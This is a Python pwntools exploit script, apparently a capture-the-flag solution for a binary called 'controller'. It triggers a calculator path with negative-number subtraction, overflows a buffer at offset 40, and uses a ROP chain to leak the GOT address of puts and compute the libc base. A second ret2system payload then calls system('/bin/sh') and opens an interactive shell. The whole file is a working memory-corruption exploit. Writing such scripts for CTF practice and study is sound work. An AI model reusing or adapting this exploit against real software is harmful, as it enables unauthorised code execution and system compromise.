from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    # Generate 65338 in calculator
    calc(p)
    # Now send cyclic pattern
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Perform subtraction of two negatives to get +65338
def calc(p):
    p.sendlineafter(': ', '-65338')
    p.sendline('-130676')
    p.sendlineafter('>', '2')


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './controller'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Swap between local and remote libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# libc = ELF('libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = 40  # find_ip(cyclic(1000))

# Start program
io = start()

# Generate 65338 in calculator
calc(io)

# Useful gadgets/functions
pop_rdi = 0x4011d3

# Leak got.puts (libc foothold)
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.calculator  # Second payload
    ]
})

# Send the payload
io.sendlineafter('>', payload)
io.recvline()

# Get our leaked got.write address and format it
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Set the libc_base_addr using the offsets
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Generate 65338 in calculator
calc(io)

# Ret2System
payload = flat({
    offset: [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.symbols.system
    ]
})

# Send the payload
io.sendlineafter('>', payload)

# Got Shell?
io.interactive()
